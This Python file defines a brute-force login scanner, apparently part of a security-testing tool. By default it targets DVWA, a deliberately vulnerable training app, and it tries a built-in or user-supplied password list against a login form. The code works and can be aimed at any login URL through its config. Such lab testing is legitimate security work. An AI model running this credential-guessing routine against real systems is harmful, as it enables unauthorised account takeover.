import requests
import time
from colorama import Fore, init
from bs4 import BeautifulSoup

init(autoreset=True)


class BruteForceScanner:
    """
    Tests DVWA's brute-force login page (vulnerabilities/brute/) for
    weak/no rate-limiting and account lockout protection by attempting
    a small curated wordlist against a known username. Proves impact
    by reporting the exact request count and password that succeeded.
    """

    WORDLIST = [
        "admin", "123456", "admin123", "letmein",
        "qwerty", "welcome", "changeme", "root",
        "toor", "iloveyou", "password123", "password"
    ]

    def __init__(self, session, base_url="http://127.0.0.1", config=None):
        self.session = session
        self.base_url = base_url.rstrip("/")
        self.config = config
        self.findings = []

        if config is not None and config.brute_url is not None:
            self.brute_url = config.full_url(config.brute_url)
            self.username_field = config.brute_username_field
            self.password_field = config.brute_password_field
            self.success_indicator = config.brute_success_text
        elif config is not None:
            # config given but no brute_url set (e.g. a generic/unknown
            # target) — fall back to base_url; the caller (main.py) is
            # expected to ask the user for the actual login page in
            # this case since it genuinely can't be guessed
            self.brute_url = self.base_url
            self.username_field = config.brute_username_field
            self.password_field = config.brute_password_field
            self.success_indicator = config.brute_success_text
        else:
            # Backward-compatible DVWA defaults
            self.brute_url = f"{self.base_url}/vulnerabilities/brute/"
            self.username_field = "username"
            self.password_field = "password"
            self.success_indicator = "Welcome to the password protected area"

    def load_wordlist(self, wordlist_path=None):
        """
        Loads passwords from a user-supplied wordlist file if given,
        otherwise falls back to the small built-in list. Warns if the
        file is very large so the user isn't surprised by a long run.
        """
        if not wordlist_path:
            print(f"{Fore.YELLOW}[*] No wordlist path given — using built-in "
                  f"list ({len(self.WORDLIST)} passwords)")
            return self.WORDLIST

        import os
        if not os.path.isfile(wordlist_path):
            print(f"{Fore.RED}[-] Wordlist not found: {wordlist_path}")
            print(f"{Fore.YELLOW}    Falling back to built-in list "
                  f"({len(self.WORDLIST)} passwords)")
            return self.WORDLIST

        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            words = [line.strip() for line in f if line.strip()]

        print(f"{Fore.GREEN}[+] Loaded wordlist: {wordlist_path} "
              f"({len(words)} passwords)")

        if len(words) > 50000:
            print(f"{Fore.YELLOW}[!] Warning: large wordlist ({len(words)} "
                  f"entries) — this scan may take a long time")
            confirm = input(f"{Fore.YELLOW}    Continue anyway? [y/N]: ").strip().lower()
            if confirm != "y":
                print(f"{Fore.YELLOW}[*] Falling back to built-in list "
                      f"({len(self.WORDLIST)} passwords)")
                return self.WORDLIST

        return words

    def attempt_login(self, username, password):
        url = self.brute_url
        params = {
            self.username_field: username,
            self.password_field: password,
            "Login": "Login"
        }

        try:
            resp = self.session.get(url, params=params, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Request failed: {e}")
            return None

        return resp.text

    def scan(self, username="admin", delay=0.3, wordlist_path=None):
        print(f"\n{Fore.CYAN}{'='*55}")
        print(f"{Fore.CYAN}   BRUTE-FORCE SCAN -> {self.brute_url}")
        print(f"{Fore.CYAN}{'='*55}\n")

        print(f"{Fore.BLUE}[*] Target username: '{username}'")
        wordlist = self.load_wordlist(wordlist_path)
        print()

        cracked_password = None
        attempts = 0
        start_time = time.time()

        for password in wordlist:
            attempts += 1
            print(f"{Fore.BLUE}[*] Attempt {attempts}/{len(wordlist)}: "
                  f"'{username}':'{password}'")

            body = self.attempt_login(username, password)
            if body is None:
                continue

            if self.success_indicator in body:
                cracked_password = password
                print(f"{Fore.RED}[!] CREDENTIALS FOUND: '{username}':'{password}'")
                break
            else:
                print(f"{Fore.YELLOW}    Failed")

            # Small delay so this reads as a real attack, not a burst —
            # also gives us a clean signal if DVWA ever adds rate limiting
            time.sleep(delay)

        elapsed = round(time.time() - start_time, 2)

        print()
        if cracked_password:
            print(f"{Fore.RED}[!] Login cracked in {attempts} attempt(s), {elapsed}s")
            print(f"{Fore.RED}    No account lockout, no CAPTCHA, no rate limiting encountered")

            self.findings.append({
                "type":      "BRUTE_FORCE",
                "severity":  "HIGH",
                "url":       self.brute_url,
                "parameter": "username/password",
                "method":    "get",
                "evidence":  (
                    f"Cracked '{username}':'{cracked_password}' in {attempts} "
                    f"attempts ({elapsed}s) with no lockout, CAPTCHA, or rate "
                    f"limiting in place"
                )
            })
        else:
            print(f"{Fore.YELLOW}[?] No password from wordlist succeeded — "
                  f"target may not be vulnerable to this specific list")

        print(f"\n{Fore.CYAN}[*] Brute-force scan complete: {len(self.findings)} finding(s)")
        return self.findings
